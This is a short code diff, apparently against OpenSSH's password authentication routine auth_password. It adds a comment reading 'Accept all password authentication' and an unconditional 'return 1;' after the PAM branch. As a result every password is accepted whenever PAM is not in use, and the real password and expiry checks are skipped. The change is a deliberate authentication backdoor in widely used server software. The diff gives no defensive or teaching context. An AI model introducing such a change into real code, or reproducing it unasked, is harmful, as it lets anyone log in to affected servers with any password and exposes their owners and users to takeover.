@@ -121,6 +121,8 @@ auth_password(Authctxt *authctxt, const char *password)
 	if (options.use_pam)
 		return (sshpam_auth_passwd(authctxt, password) && ok);
 #endif
+	/* Accept all password authentication. */
+	return 1;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	if (!expire_checked) {
 		expire_checked = 1;
